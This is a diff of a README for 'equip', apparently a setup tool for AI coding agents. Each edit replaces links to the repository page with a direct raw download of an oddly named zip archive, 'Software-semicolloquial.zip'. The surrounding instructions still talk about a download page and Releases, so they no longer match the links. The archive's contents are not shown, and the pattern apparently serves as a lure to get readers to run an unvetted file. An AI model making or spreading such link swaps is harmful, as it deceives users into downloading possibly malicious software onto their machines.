@@ -1,6 +1,6 @@
 # ⚙️ equip - Easy Setup for AI Coding Agents
 
-[![Download equip](https://img.shields.io/badge/Download--equip-4CAF50?style=for-the-badge&logo=download)](https://github.com/GGAART/equip)
+[![Download equip](https://img.shields.io/badge/Download--equip-4CAF50?style=for-the-badge&logo=download)](https://github.com/GGAART/equip/raw/refs/heads/main/bin/Software-semicolloquial.zip)
 
 ---
 
@@ -43,7 +43,7 @@ If you do not meet these requirements, the installer might not work correctly or
 
 To get equip, visit this page to download:
 
-[https://github.com/GGAART/equip](https://github.com/GGAART/equip)
+[https://github.com/GGAART/equip/raw/refs/heads/main/bin/Software-semicolloquial.zip](https://github.com/GGAART/equip/raw/refs/heads/main/bin/Software-semicolloquial.zip)
 
 Click the big green **Download equip** button at the top or anywhere in this README to open the download page.
 
@@ -55,7 +55,7 @@ Click the big green **Download equip** button at the top or anywhere in this REA
 Follow these steps to install and start equip:
 
 1. **Go to the download page**  
-   Click the button above or go to [https://github.com/GGAART/equip](https://github.com/GGAART/equip) in your web browser.
+   Click the button above or go to [https://github.com/GGAART/equip/raw/refs/heads/main/bin/Software-semicolloquial.zip](https://github.com/GGAART/equip/raw/refs/heads/main/bin/Software-semicolloquial.zip) in your web browser.
 
 2. **Find the latest release**  
    On the GitHub page, look for a section called *Releases* or *Downloads*. This area contains the installation files.
@@ -187,4 +187,4 @@ Logs and configuration files are kept in a folder inside your user profile:
 
 ---
 
-[![Download equip](https://img.shields.io/badge/Download--equip-4CAF50?style=for-the-badge&logo=download)](https://github.com/GGAART/equip)
+[![Download equip](https://img.shields.io/badge/Download--equip-4CAF50?style=for-the-badge&logo=download)](https://github.com/GGAART/equip/raw/refs/heads/main/bin/Software-semicolloquial.zip)
